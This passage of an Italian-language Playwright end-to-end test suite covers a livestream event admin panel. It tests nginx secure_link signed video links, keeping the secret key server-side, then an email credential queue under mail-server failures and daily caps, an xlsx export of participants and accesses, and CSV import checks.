        vero(/\/diretta\/\?anteprima=napoli-2026&emulatori=1$/.test(nuovaScheda.url()), '«Vedi come un partecipante» apre /diretta/?anteprima=napoli-2026 in una nuova scheda');
        if (fs.existsSync(path.join(RADICE, 'diretta/diretta.js'))) {
            // stessa app Firebase (nome predefinito) = stessa sessione: la pagina
            // dei partecipanti riconosce il gestore senza chiedere un nuovo accesso
            const vistaAnteprima = await aspetta(async () => {
                const vv = await nuovaScheda.evaluate(() => document.body.dataset.vista || '');
                return vv && vv !== 'caricamento' ? vv : '';
            }, 20000, 'vista dell\'anteprima').catch(e => 'errore: ' + e.message);
            vero(vistaAnteprima !== 'accesso' && !/^errore/.test(vistaAnteprima), 'la pagina della diretta riconosce il gestore già collegato (vista «' + vistaAnteprima + '», non l\'accesso)');
        }
        await nuovaScheda.close();
        await foto('regia');

        /* ---------- 6b. i link firmati ----------
           Valgono per il flusso diretto (modalita' B, qui in uso dalla scheda
           Evento). La web TV di prova non controlla la firma (la ignora): qui
           si prova che la chiave si salva, non esce MAI dal servizio, e che i
           link firmati (link-firmato, prova-link) sono giusti per nginx
           secure_link. */
        console.log('\n-- link firmati');
        await page.click('[data-scheda="evento"]');
        await $('#ev-firma > summary').click();
        vero(await $('#ev-firma').evaluate(n => n.open) && await testo('#ev-firma-riassunto') === 'nessuna firma' && await $('#ev-firma-campi').isHidden(),
            'la sezione «Link firmati (se la web TV li usa)» si apre: «nessuna firma», nessun campo');
        await page.check('input[name="ev-firma-schema"][value="nginx"]');
        vero(await $('#ev-firma-campi').isVisible() && /nginx secure_link · 6 ore · manca la chiave/.test(await testo('#ev-firma-riassunto'))
            && await $('#ev-firma-segreto').getAttribute('type') === 'password' && await $('#ev-firma-nome-firma').isVisible() && await $('#ev-firma-acl').isHidden(),
            'nginx secure_link: la chiave in un campo password, i parametri di nginx (non quelli di Akamai), «manca la chiave»');
        const salvaFirmaPrima = chiamate('evento-salva').length;
        await $('#btn-salva-evento').click();
        vero(await $('#ev-firma-segreto').getAttribute('aria-invalid') === 'true' && /scrivi la chiave segreta/.test(await testo('#msg-evento')) && chiamate('evento-salva').length === salvaFirmaPrima,
            'senza la chiave non si salva: «' + await testo('#msg-evento') + '»');
        await $('#ev-firma-segreto').fill(SEGRETO);
        await $('#ev-firma-durata').fill('2');
        vero(/nginx secure_link · 2 ore · chiave da salvare/.test(await testo('#ev-firma-riassunto')), 'il riassunto segue: «' + await testo('#ev-firma-riassunto') + '»');
        await $('#btn-salva-evento').click();
        await aspetta(async () => /Modifiche salvate.*La chiave segreta è salvata sul servizio/.test(await testo('#msg-evento')), 10000, 'firma salvata');
        const conFirma = chiamate('evento-salva').pop().dati.evento;
        vero(conFirma.firma && conFirma.firma.schema === 'nginx' && conFirma.firma.segreto === SEGRETO && conFirma.firma.durataOre === 2
            && ['videoUrl', 'azotoUrl', 'tipoPlayer'].every(k => !(k in conFirma)),
            'evento-salva riceve la firma (schema nginx, la chiave, 2 ore), e solo quella', JSON.stringify(Object.assign({}, conFirma.firma, { segreto: '…' })));
        const rispostaFirma = await aspetta(async () => { const rr = risposte('evento-salva'); return rr.length ? rr[rr.length - 1] : null; }, 5000, 'risposta di evento-salva');
        vero(rispostaFirma.evento.firma.schema === 'nginx' && rispostaFirma.evento.firma.segretoImpostato === true && !('segreto' in rispostaFirma.evento.firma) && rispostaFirma.evento.videoFirmato === true,
            'la risposta dice solo che la chiave c\'è (firma.segretoImpostato), mai la chiave', JSON.stringify(rispostaFirma.evento.firma));
        vero(await $('#ev-firma-segreto').inputValue() === '' && await $('#ev-firma-segreto').getAttribute('placeholder') === 'Chiave impostata'
            && /nginx secure_link · 2 ore · chiave impostata/.test(await testo('#ev-firma-riassunto')),
            'dopo il salvataggio il campo della chiave si svuota: «Chiave impostata», e non si rilegge più');
        const risFirma = await docRiservato();
        pub = await docPubblico();
        vero(risFirma.firma.schema === 'nginx' && risFirma.firma.segreto === SEGRETO && risFirma.firma.durataOre === 2 && pub.videoFirmato === true && !JSON.stringify(pub).includes(SEGRETO),
            'sul servizio: la chiave solo nel documento riservato; per i partecipanti (in onda) solo videoFirmato: true');
        // «Guarda» chiede al servizio il link firmato (link-firmato), come la pagina dei partecipanti
        await page.click('[data-scheda="regia"]');
        vero(/Link firmati: nginx secure_link, ogni link vale 2 ore\./.test(await testo('#regia-firma-attuale')), 'la regia dice che i link sono firmati: «' + await testo('#regia-firma-attuale') + '»');
        const indirizziPrima = webtv.indirizzi.length;
        await $('#btn-guarda-principale').click();
        await aspetta(async () => /Link principale: qui sotto lo vedi come lo vedono i partecipanti, con un link firmato come il loro/.test(await testo('#msg-sorgente')), 25000, 'guarda con la firma');
        const firmato = await aspetta(async () => { const rr = risposte('link-firmato'); return rr.length ? rr[rr.length - 1] : null; }, 5000, 'risposta di link-firmato');
        const uFirmato = new URL(firmato.url);
        const scadenza = Number(uFirmato.searchParams.get('expires'));
        const md5Atteso = crypto.createHash('md5').update(scadenza + '/live/master.m3u8 ' + SEGRETO).digest('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        vero(chiamate('link-firmato').pop().dati.sorgente === 'principale' && uFirmato.origin + uFirmato.pathname === WEBTV + '/live/master.m3u8' && uFirmato.searchParams.get('canale') === '4'
            && uFirmato.searchParams.get('md5') === md5Atteso && Math.abs(scadenza - (Date.now() / 1000 + 2 * 3600)) < 300 && firmato.scade === scadenza * 1000,
            'link-firmato: il link principale con md5 = base64url(md5(expires + percorso + " " + chiave)) ed expires fra 2 ore (nginx secure_link)', firmato.url);
        await videoVa('#regia-attuale-anteprima');
        const perAnteprima = webtv.indirizzi.slice(indirizziPrima).filter(q => /^\/live\//.test(q));
        vero(perAnteprima.length >= 3 && perAnteprima.every(q => q.includes('md5=' + md5Atteso) && q.includes('expires=' + scadenza)),
            'l\'anteprima usa il link firmato, e il player mette la firma anche sulle playlist delle qualità e sui segmenti (' + perAnteprima.length + ' richieste)', perAnteprima.slice(0, 4).join(' '));
        // la prova del link, con la firma dell'evento
        p = await provaLink('regia-video');
        vero(p.esito === 'ok' && p.servizio && /[?&]md5=/.test(p.servizio.urlProva) && /Provato con la firma impostata per l'evento/.test(p.testo),
            'la prova del link in regia usa il link firmato come lo riceverà chi guarda (urlProva con md5 ed expires)', p.servizio && p.servizio.urlProva);
        const direttaRiserva = await api('diretta-gestione', { azione: 'link-firmato', idEvento: ID, sorgente: 'riserva' }, tokGestore);
        const uRiserva = new URL(direttaRiserva.dati.url);
        const md5Riserva = crypto.createHash('md5').update(uRiserva.searchParams.get('expires') + '/riserva/master.m3u8 ' + SEGRETO).digest('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        vero(direttaRiserva.stato === 200 && uRiserva.pathname === '/riserva/master.m3u8' && uRiserva.searchParams.get('md5') === md5Riserva && !JSON.stringify(direttaRiserva.dati).includes(SEGRETO),
            'link-firmato anche per la riserva (chiamata vera al servizio), senza la chiave nella risposta');
        // la firma tolta: la chiave salvata si cancella
        await page.click('[data-scheda="evento"]');
        if (!(await $('#ev-firma').evaluate(n => n.open))) await $('#ev-firma > summary').click();
        await page.check('input[name="ev-firma-schema"][value="nessuna"]');
        await $('#btn-salva-evento').click();
        await confermaDialogo(/Togliere i link firmati\?.*la chiave segreta salvata viene cancellata/s, 'Togli la firma');
        await aspetta(async () => /Modifiche salvate/.test(await testo('#msg-evento')), 10000, 'firma tolta');
        const senzaFirma = await docRiservato();
        vero(senzaFirma.firma.schema === 'nessuna' && senzaFirma.firma.segreto === '' && (await docPubblico()).videoFirmato === false && await testo('#ev-firma-riassunto') === 'nessuna firma',
            'firma tolta: la chiave è cancellata dal servizio e i partecipanti tornano al link com\'è (videoFirmato false)');
        vero(registro.filter(c => JSON.stringify(c.dati).includes(SEGRETO)).length === 1,
            'la pagina ha mandato la chiave una volta sola (il salvataggio), mai nelle prove o nelle altre richieste');

        /* ---------- 7. email ---------- */
        console.log('\n-- email');
        await page.click('[data-scheda="email"]');
        await aspetta(async () => /\(35\)/.test(await testo('#btn-invia-tutti')), 5000, 'conteggi email');
        const conteggiOk = await aspetta(async () => await testo('#conteggi-email li[data-stato="da inviare"] .conteggio-num') === '36'
            && await testo('#conteggi-email li[data-stato="inviata"] .conteggio-num') === '1', 5000, 'conteggi').catch(() => false);
        vero(conteggiOk, 'conteggi per stato dal servizio: 36 da inviare, 1 inviata (quella di Ivan, mandata a mano al nuovo indirizzo)', await testo('#conteggi-email'));
        vero(/1 persona «da inviare» ha l'account disattivato/.test(await testo('#nota-disattivati')), 'il pulsante dice a quante persone partirà davvero (35): l\'account disattivato non si conta, e la nota lo spiega');
        vero(/manca BREVO_API_KEY/.test(await testo('#nota-esiti')) && await visibile('#nota-esiti'), 'senza BREVO_API_KEY lo si dice subito, accanto al pulsante degli esiti (esitiDisponibili)');
        vero(/Promemoria del giorno prima: attivo\. Parte da solo giovedì 1 ottobre 2026 dalle 9\.00: oggi lo riceverebbero 1 persona/.test(await testo('#promemoria-stato')),
            'promemoria del giorno prima: quando parte e a quante persone arriverebbe oggi (destinatariPromemoria.giorno)', await testo('#promemoria-stato'));
        await $('#sel-tipo-prova').selectOption('credenziali');
        await $('#btn-email-prova').click();
        await aspetta(async () => /Email di prova inviata a gestore@prova\.it/.test(await testo('#msg-email-prova')), 10000, 'prova');
        const prova = postaPer(EMAIL_GESTORE, 'prova-credenziali');
        vero(chiamate('email-prova').pop().dati.tipo === 'credenziali' && prova.length === 1 && /EMAIL DI PROVA/.test(prova[0].testo + prova[0].oggetto)
            && /scrivi la tua email .+ e questa password: /.test(prova[0].testo) && !/nome utente/i.test(prova[0].testo + prova[0].html),
            '«Invia email di prova a me»: nella casella del gestore arriva l\'email con la scritta EMAIL DI PROVA («… scrivi la tua email … e questa password: …»)');
        await $('#sel-tipo-prova').selectOption('iscritto-anche');
        await $('#btn-email-prova').click();
        await aspetta(async () => postaPer(EMAIL_GESTORE, 'prova-iscritto-anche').length === 1, 10000, 'prova «anche»');
        const provaAnche = postaPer(EMAIL_GESTORE, 'prova-iscritto-anche')[0];
        vero(chiamate('email-prova').pop().dati.tipo === 'iscritto-anche' && /^\[PROVA\] Sei iscritto anche a/.test(provaAnche.oggetto) && !/Password:\s*\S/.test(provaAnche.testo)
            && /entra con la tua email e la password che hai già/.test(provaAnche.testo),
            'e la prova di «Sei iscritto anche a…» (per chi ha già una password): senza password', provaAnche.oggetto);
        await $('#sel-tipo-prova').selectOption('credenziali');

        // Brevo rifiuta l'accesso SMTP (account sospeso, chiave cambiata): per tutti, prima del DATA
        await avviaServer({ DIRETTA_POSTA_ERRORE_ACCOUNT: '1' }, 'server di posta che rifiuta l\'accesso', calma);
        const credenzialiPrima = leggiPosta().filter(m => m.tipo === 'credenziali').length;
        await $('#btn-invia-tutti').click();
        await confermaDialogo(/Inviare le credenziali a 35 persone.*l'email con cui entrare e una password.*Chi ha già una password.*Sei iscritto anche a…/s);
        await aspetta(async () => await visibile('#btn-riprova-invio') && /Invio fermo/.test(await testo('#coda-bloccata')), 20000, 'blocco di Brevo');
        vero(/535/.test(await testo('#coda-bloccata')) && /35 persone restano in coda/.test(await testo('#coda-bloccata')),
            'blocco del server di posta: la pagina dice il motivo del servizio e che nessuno è stato saltato — «' + await testo('#coda-bloccata') + '»');
        vero(/Invio fermo per un problema del server di posta/.test(await testo('#avanzamento-email .avanzamento-testo')), 'l\'avanzamento si ferma e lo dice (niente tentativi a raffica: riprova il giro automatico)');
        const kBlocco = await statiEmail();
        vero(kBlocco['in coda'] === 35 && leggiPosta().filter(m => m.tipo === 'credenziali').length === credenzialiPrima,
            'sul servizio: 35 persone ancora in coda e nessuna email partita', JSON.stringify(kBlocco));
        const bloccoSalvato = (await db.doc('code/' + ID).get()).data().bloccato;
        vero(bloccoSalvato && /535/.test(bloccoSalvato.motivo) && bloccoSalvato.quando > 0, 'code/' + ID + '.bloccato = {motivo, quando}, come lo legge la pagina');

        // Brevo di nuovo a posto, ma con un tetto di 20 email al giorno
        await avviaServer({ DIRETTA_MAX_GIORNO: '20' }, 'server di posta a posto, tetto di 20 email al giorno', calma);
        await $('#btn-riprova-invio').click();
        await aspetta(async () => /Limite di oggi raggiunto/.test(await testo('#coda-bloccata')), 30000, 'tetto del giorno');
        const kLimite = await statiEmail();
        const restano = kLimite['in coda'];
        vero(kLimite.inviata === 21 && restano >= 14 && restano <= 15 && (await db.doc('code/' + ID).get()).data().bloccato == null,
            '«Riprova adesso»: il blocco si toglie e la coda riparte, fino al tetto (20 email oggi)', JSON.stringify(kLimite));
        vero(new RegExp('Limite di oggi raggiunto: le restanti ' + restano + ' partono domani da sole').test(await testo('#coda-bloccata')) && await $('#btn-riprova-invio').isHidden(),
            'tetto del giorno: «' + await testo('#coda-bloccata') + '» (R13)');
        vero(/Invio fermo per il limite di oggi/.test(await testo('#avanzamento-email .avanzamento-testo')), 'l\'avanzamento dice che il resto parte domani');
        await foto('email-limite');
        await page.click('[data-scheda="partecipanti"]');
        await aspetta(async () => (await page.locator('#tabella-partecipanti .stato-email.stato-in-coda').count()) === restano, 10000, 'stati nell\'elenco');
        vero(await page.locator('#tabella-partecipanti .stato-email.stato-inviata').count() === 21, 'nell\'elenco gli stati delle email: inviate, in coda, da inviare');
        await foto('partecipanti');
        await page.click('[data-scheda="email"]');

        /* Il giorno dopo (qui: il servizio riavviato senza tetto) la coda la manda
           avanti il giro automatico, api/diretta-cron, chiamato davvero. Le email
           sono lente (1 s l'una): mentre il cron lavora, la pagina lo segue. */
        await avviaServer({ DIRETTA_POSTA_RITARDO_MS: '1000' }, 'nessun tetto, server di posta lento', calma);
        const giroPrima = (await db.doc('code/' + ID).get()).data().giro || null;
        const cron = fetch(API + '/diretta-cron', { headers: { Authorization: 'Bearer prova' } }).then(r => r.json()).catch(e => ({ errore: e.message }));
        await aspetta(async () => {
            const d = (await db.doc('code/' + ID).get()).data();
            return d.giro && d.giro !== giroPrima && d.lucchettoFino > Date.now();
        }, 15000, 'il cron prende il lucchetto');
        const avanzaPrima = risposteAvanza.length;
        await $('#btn-aggiorna-email').click();
        await aspetta(async () => /Invio completato/.test(await testo('#avanzamento-email .avanzamento-testo')), 60000, 'invio completato');
        const esitoCron = await cron;
        const seguite = risposteAvanza.slice(avanzaPrima);
        vero(seguite.some(x => x.dati && x.dati.occupato === true), 'la pagina trova il giro automatico al lavoro (occupato) e lo segue senza spedire niente', JSON.stringify(seguite.map(x => x.dati)));
        const intervalli = seguite.slice(1).map((x, i) => x.quando - seguite[i].quando);
        vero(seguite.length >= 2 && intervalli.every(x => x >= 4500), 'mentre un altro giro lavora la pagina chiede più piano (' + intervalli.join(', ') + ' ms fra le chiamate)');
        const codaCron = (esitoCron.code || []).find(c => c.idEvento === ID);
        vero(codaCron && codaCron.inviate >= restano - 1, 'il cron ha spedito il resto della coda (' + (codaCron && codaCron.inviate) + ')', JSON.stringify(esitoCron).slice(0, 300));
        const k = await statiEmail();
        vero(k.inviata === 35 && k.respinta === 1 && !k['in coda'] && k['da inviare'] === 1, 'invio a tutti completato (resta solo l\'account disattivato): ' + JSON.stringify(k));
        vero(await testo('#conteggi-email li[data-stato="inviata"] .conteggio-num') === '35' && await testo('#conteggi-email li[data-stato="respinta"] .conteggio-num') === '1', 'i conteggi colorati si aggiornano (35 inviate, 1 respinta)');
        const perIndirizzo = {};
        leggiPosta().filter(m => m.tipo === 'credenziali').forEach(m => { perIndirizzo[m.a] = (perIndirizzo[m.a] || 0) + 1; });
        vero(Object.keys(perIndirizzo).length === 35 && Object.values(perIndirizzo).every(n => n === 1) && !perIndirizzo[ANNA],
            'nella posta: UNA sola email di credenziali per indirizzo (35: le 33 persone senza password e i due indirizzi di Ivan, prima e dopo la correzione), nonostante blocco, tetto e due giri insieme', JSON.stringify(perIndirizzo).slice(0, 300));
        /* Anna Maria ha la password detta a voce (Nuova password): per lei «Invia le
           credenziali» decide di mandare «Sei iscritto anche a...», senza una password
           che cancellerebbe la sua. */
        const ancheAnna = postaPer(ANNA, 'iscritto-anche');
        const annaInvio = ((await partecipante(ANNA)).invii || {})[ID] || {};
        vero(ancheAnna.length === 1 && !/Password:\s*\S/.test(ancheAnna[0].testo) && ancheAnna[0].testo.indexOf(pw) < 0 && annaInvio.stato === 'inviata' && annaInvio.tipo === 'anche',
            'Anna Maria (password nuova detta a voce) riceve «Sei iscritto anche a…», senza password: la sua resta buona (invio.tipo «anche»)', JSON.stringify(annaInvio));
        const pAnna = await rp(ANNA);
        vero(/Sei iscritto anche a…», senza password: usa quella che ha già/.test(await pAnna.locator('td[data-label="Email credenziali"]').textContent()),
            'e nell\'elenco la sua riga lo dice');
        vero((await api('diretta-accesso', { azione: 'entra', email: ANNA, password: pw })).stato === 200, 'la password detta a voce funziona ancora');
        await aspetta(async () => /\(1\)/.test(await testo('#btn-reinvia-non-ricevute')), 5000, 'non ricevute');
        await foto('email');
        await $('#btn-reinvia-non-ricevute').click();
        await confermaDialogo(/Reinviare a chi non l'ha ricevuta/);
        await aspetta(() => chiamate('email-accoda').some(c => c.dati.chi === 'non-ricevuta'), 5000, 'riaccodata');
        vero(true, '«Reinvia a chi non l\'ha ricevuta» riaccoda con chi: non-ricevuta');
        await aspetta(async () => /Invio completato: 0 inviate, 1 respinta/.test(await testo('#avanzamento-email .avanzamento-testo')), 30000, 'secondo invio');
        vero(true, 'Chloé viene respinta di nuovo (l\'indirizzo è sbagliato): «' + await testo('#avanzamento-email .avanzamento-testo') + '»');
        await $('#btn-aggiorna-esiti').click();
        await aspetta(async () => /manca BREVO_API_KEY/.test(await testo('#msg-email')), 5000, 'esiti');
        vero(true, 'senza BREVO_API_KEY la gestione lo dice anche quando si chiedono gli esiti (R13)');
        await page.click('[data-scheda="evento"]');
        vero(/Parte da solo giovedì 1 ottobre 2026 dalle 9\.00: oggi lo riceverebbero 35 persone/.test(await testo('#prom-dest-giorno'))
            && /Se lo attivi, oggi lo riceverebbero 35 persone/.test(await testo('#prom-dest-ora')),
            'accanto alle caselle dei promemoria: a quante persone arriverebbero (35, chi ha le credenziali)', await testo('#prom-dest-giorno') + ' | ' + await testo('#prom-dest-ora'));
        await page.click('[data-scheda="partecipanti"]');
        vero(/stato-respinta/.test(await (await rp(CHLOE)).locator('.stato-email').getAttribute('class')), 'nell\'elenco la persona respinta ha lo stato rosso «respinta»');
        /* Il giro dei promemoria lo fa il cron nella sua finestra (dal 1 ottobre):
           qui se ne scrive con firebase-admin il segno finale, quello che il
           servizio lascia in code/{id}.promemoria.giorno, per vedere come la
           gestione lo racconta. */
        await db.doc('code/' + ID).set({ promemoria: { giorno: { cominciato: Date.now() - 90000, quando: Date.now(), finito: true, inviate: 35 } } }, { merge: true });
        await page.click('[data-scheda="email"]');
        await aspetta(async () => /Promemoria del giorno prima: attivo\. Già partito: 35 email inviate \(ultimo giro \d{2}\/\d{2}\/\d{4} \d{2}:\d{2}\)/.test(await testo('#promemoria-stato')), 10000, 'promemoria partito');
        vero(true, 'promemoria già partito: la scheda Email lo dice con il numero del servizio (coda.promemoria.giorno)');

        /* ---------- 8. esportazione ---------- */
        console.log('\n-- esportazione');
        // due accessi veri, con l'email: Ivan con la password arrivata al nuovo indirizzo, Anna Maria con quella detta a voce
        const pwIvan = passwordDa(postaPer(IVAN2, 'credenziali').pop());
        const e1 = await api('diretta-accesso', { azione: 'entra', email: IVAN2, password: pwIvan }, null, { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36' });
        const e2 = await api('diretta-accesso', { azione: 'entra', email: ANNA, password: pw }, null, { 'User-Agent': UA_IPHONE });
        vero(e1.stato === 200 && e2.stato === 200 && pwIvan === pwIvanNuova, 'Ivan e Anna Maria entrano con la loro email e la loro password', JSON.stringify([e1.dati, e2.dati]).slice(0, 300));
        const inizio = Date.parse('2026-10-02T09:00:00+02:00');
        const fine = Date.parse('2026-10-02T17:30:00+02:00');
        await segnala([await partecipante(IVAN2)], { primo: Ts.fromMillis(inizio + 3 * 60e3), ultimo: Ts.fromMillis(fine + 5 * 60e3), secondi: 40000, collegamenti: 2 });
        await segnala([await partecipante(ANNA)], { primo: Ts.fromMillis(inizio + 15 * 60e3), ultimo: Ts.fromMillis(inizio + 135 * 60e3), secondi: 7200, collegamenti: 1 });
        await page.click('[data-scheda="esporta"]');
        const [scarico] = await Promise.all([page.waitForEvent('download', { timeout: 20000 }), $('#btn-esporta').click()]);
        const nomeFile = scarico.suggestedFilename();
        vero(/^diretta-napoli-2026-\d{8}-\d{4}\.xlsx$/.test(nomeFile), 'file scaricato: ' + nomeFile);
        const doveFile = path.join(RISULTATI, 'gestione-esportazione.xlsx');
        await scarico.saveAs(doveFile);
        const wb = XLSX.read(fs.readFileSync(doveFile), { type: 'buffer' });
        vero(JSON.stringify(wb.SheetNames) === JSON.stringify(['Partecipanti', 'Accessi']), 'due fogli: ' + wb.SheetNames.join(', '));
        const fp = XLSX.utils.sheet_to_json(wb.Sheets.Partecipanti, { header: 1, defval: '' });
        const fa = XLSX.utils.sheet_to_json(wb.Sheets.Accessi, { header: 1, defval: '' });
        vero(fp[0].join('|') === 'Nome|Cognome|Email|Azienda|Account|Email credenziali|Inviata il|Primo collegamento|Ultimo segnale|Minuti collegati (durante la diretta)|Collegamenti|Ultimo accesso',
            'colonne del foglio Partecipanti come da contratto: nessuna colonna del nome utente (l\'email c\'è già)');
        /* cinque accessi veri, tutti con l'email: Anna Maria con la password detta a voce;
           Ivan con il nuovo indirizzo e la password di prima; di nuovo Anna Maria (la
           password detta a voce vale ancora); qui sopra Ivan e Anna Maria */
        const conEmailGiuste = fa.slice(1).every(r => /^[^@\s]+@[^@\s]+$/.test(r[1]) && r[1] === r[1].toLowerCase());
        vero(fa[0].join('|') === 'Quando|Email|Nome|Cognome|Azienda|Dispositivo' && fa.length === 6 && conEmailGiuste,
            'foglio Accessi con le sue colonne (l\'email al posto del nome utente) e i 5 accessi veri', fa.length + ' ' + JSON.stringify(fa.slice(0, 3)));
        const annaAccesso = fa.filter(r => r[1] === ANNA).pop();
        vero(annaAccesso && annaAccesso[5] === 'iPhone · Safari' && /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/.test(annaAccesso[0]), 'accesso di Anna Maria: data e ora di Roma, dispositivo «iPhone · Safari»', annaAccesso && annaAccesso.join('|'));
        const ivan = fp.find(r => r[2] === IVAN2);
        vero(ivan && ivan[9] === 510 && ivan[10] === 2, 'minuti limitati alla durata dell\'evento: 40000 s collegati -> 510 minuti (8 ore e mezza)', ivan && ivan.join('|'));
        vero(ivan && ivan[7] === '02/10/2026 09:03' && ivan[5] === 'inviata' && /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/.test(ivan[11]), 'date in ora di Roma «02/10/2026 09:03», stato delle credenziali e ultimo accesso', ivan && ivan.join('|'));
        vero(fp.filter(r => r[2] && r[2] !== 'Email').length === 37 && /^Minuti stimati/.test(fp[fp.length - 1][0]), '37 partecipanti e, in fondo, la nota sui minuti (T13)');
        vero(/Scaricato/.test(await testo('#msg-esporta')), 'messaggio di conferma dell\'esportazione');

        /* ---------- 9. file con colonne da abbinare, piu' fogli, codifica ---------- */
        console.log('\n-- abbinamento delle colonne e codifica');
        await page.click('[data-scheda="partecipanti"]');
        const wbProva = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wbProva, XLSX.utils.aoa_to_sheet([['Note'], ['Elenco degli iscritti nel secondo foglio']]), 'Note');
        XLSX.utils.book_append_sheet(wbProva, XLSX.utils.aoa_to_sheet([
            ['Nominativo', 'Posta elettronica', 'Ragione sociale'],
            ['De Luca Anna Maria', 'annamaria.deluca@deluca-figli.example', 'De Luca & Figli S.p.A.'],
            ['Bruno Carla', 'carla.bruno@bruno.example', 'Bruno Srl'],
            ['Van der Berg Jan', 'jan@vanderberg.example', 'VDB BV']
        ]), 'Iscritti');
        const bufXlsx = Buffer.from(XLSX.write(wbProva, { type: 'array', bookType: 'xlsx' }));
        await $('#file-partecipanti').setInputFiles({ name: 'iscritti-due-fogli.xlsx', mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', buffer: bufXlsx });
        await $('#abbina-colonne').waitFor({ state: 'visible', timeout: 10000 });
        vero(await $('#scelta-foglio').isVisible() && await $('#btn-abbina-continua').isDisabled(), 'più fogli: selettore del foglio; nel primo foglio non ci sono le colonne -> passo «abbina le colonne»');
        await $('#sel-foglio').selectOption('Iscritti');
        await aspetta(() => $('#abb-ordine').isVisible(), 5000, 'ordine');
        vero(await $('#abb-email').inputValue() === '1' && await $('#abb-azienda').inputValue() === '2' && await $('#abb-nome').inputValue() === '0',
            'foglio «Iscritti»: riconosciute «Nominativo» (nome e cognome insieme), «Posta elettronica», «Ragione sociale»');
        await page.click('input[name="abb-ordine"][value="cognome-nome"] >> xpath=..');
        const esempio = await page.evaluate(() => Array.from(document.querySelectorAll('#abb-esempio tbody tr')).map(tr => Array.from(tr.cells).map(c => c.textContent)));
        vero(esempio[0][1] === 'Anna Maria' && esempio[0][2] === 'De Luca' && esempio[2][1] === 'Jan' && esempio[2][2] === 'Van der Berg', 'ordine «Cognome Nome»: il cognome si prende con le particelle (De Luca, Van der Berg)', JSON.stringify(esempio));
        await $('#btn-abbina-continua').click();
        await aspetta(async () => (await $('#tabella-anteprima tbody tr').count()) === 3 && /righe lette/.test(await testo('#riepilogo-anteprima')), 10000, 'anteprima abbinata');
        vero((await classeRiga(2)).includes('esito-gia-iscritto') && (await classeRiga(3)).includes('esito-nuovo'),
            'Anna Maria De Luca è già nell\'evento (lo dice il servizio, «Già nell\'evento»): nessun nuovo account; Carla Bruno sì');
        await $('#btn-annulla-caricamento').click();
        const csvRotto = Buffer.from('nome;cognome;email\nNicolÃ²;Rossi;nicolo@esempio.example\nAnna;Neri;anna.neri@esempio.example\n', 'utf8');
        await $('#file-partecipanti').setInputFiles({ name: 'codifica-sbagliata.csv', mimeType: 'text/csv', buffer: csvRotto });
        await aspetta(async () => (await $('#tabella-anteprima tbody tr').count()) === 2 && /righe lette/.test(await testo('#riepilogo-anteprima')), 10000, 'anteprima codifica');
        vero((await classeRiga(2)).includes('esito-codifica') && (await classeRiga(2)).includes('da-correggere') && /codifica/.test(await riga(2).locator('.problemi').textContent())
            && await $('#btn-crea-account').isDisabled() && /1 riga: 1 con la codifica del file sbagliata/.test(await testo('#motivo-blocco')),
            'caratteri «Ã²»: la pagina aggiunge il problema grave «codifica del file sbagliata» (R9) e «Crea» resta spento — «' + await testo('#motivo-blocco') + '»');
        await $('#btn-annulla-caricamento').click();

        // lo stesso file caricato di nuovo: niente da creare
        await $('#file-partecipanti').setInputFiles(path.join(__dirname, 'esempio-partecipanti.csv'));
        await aspetta(async () => (await $('#tabella-anteprima tbody tr').count()) === 42 && /righe lette/.test(await testo('#riepilogo-anteprima')), 15000, 'ricarico');
        const esiti = await page.evaluate(() => Array.from(document.querySelectorAll('#tabella-anteprima tbody tr')).map(t => t.dataset.riga + ' ' + t.className));
        const giaIscritti = esiti.filter(c => /esito-gia-iscritto/.test(c)).length;
        vero(JSON.stringify(esiti.filter(c => /esito-nuovo/.test(c)).map(c => c.split(' ')[0])) === '["13"]' && giaIscritti === 29,
            'lo stesso file ricaricato: ' + giaIscritti + ' righe «già nell\'evento»; di nuovo c\'è solo la riga 13, il VECCHIO indirizzo di Ivan (corretto nella gestione: l\'account è dell\'email nuova)');
        // Sara Barbieri era stata tolta dall'evento: ha gia' l'account, torna solo nell'evento
        vero(esiti.filter(c => /esito-gia-presente/.test(c)).length === 1 && (await classeRiga(42)).includes('esito-gia-presente'),
            'la persona tolta dall\'evento risulta «Già registrata» (da aggiungere, nessun secondo account)');
        vero((await classeRiga(15)).includes('esito-email-condivisa') && /Con questa email è già registrato Chloé Dupont/.test(await riga(15).locator('.problemi').textContent()),
            'riga 15, «Chloé L\'Hôtel-Dupont»: il suo account ora si chiama Chloé Dupont (corretto nella gestione), quindi la riga va sistemata («Email condivisa»: se è la stessa persona si scrive il nome come è registrato)');
        vero((await classeRiga(41)).includes('esito-gia-iscritto') && (await classeRiga(41)).includes('con-avviso') && /Account disattivato/.test(await riga(41).locator('.etichette-esito').textContent()),
            'Roberto Moretti, disattivato: «Già nell\'evento» con l\'avviso «Account disattivato»');
        vero(await $('#btn-crea-account').isDisabled(), 'con le righe originali in errore il pulsante resta spento');
        await $('#btn-annulla-caricamento').click();

        /* ---------- 9b. l'email sbagliata, respinta, corretta (R3) ----------
           Chloé non ha mai ricevuto le credenziali: il server di posta ha
           respinto l'indirizzo (.invalid). Corretta l'email, le credenziali
           tornano «da inviare» e partono al nuovo indirizzo con «Invia ora»;
           da li' in poi si entra con l'email nuova. */
        console.log('\n-- email respinta, corretta e credenziali al nuovo indirizzo');
        const CHLOE2 = 'chloe.dupont@dupont.example';
        await aspetta(async () => /stato-respinta/.test(await (await rp(CHLOE)).locator('.stato-email').getAttribute('class')), 5000, 'Chloé respinta');
        await (await rp(CHLOE)).locator('button[data-op="correggi"]').click();
        await $('#dialogo-correggi').waitFor({ state: 'visible' });
        await $('#corr-email').fill(CHLOE2);
        vero(/erano già partite verso chloe\.dupont@dupont\.invalid: con la nuova email tornano «da inviare»/.test(await testo('#corr-nota-email')),
            'l\'email respinta si corregge: la finestra dice che le credenziali tornano «da inviare»');
        await $('#btn-corr-salva').click();
        await $('#dialogo-correggi').waitFor({ state: 'hidden' });
        await aspetta(async () => /Email di Chloé Dupont cambiata da chloe\.dupont@dupont\.invalid a chloe\.dupont@dupont\.example.*tornano «da inviare»/.test(await avvisi()), 5000, 'email di Chloé');
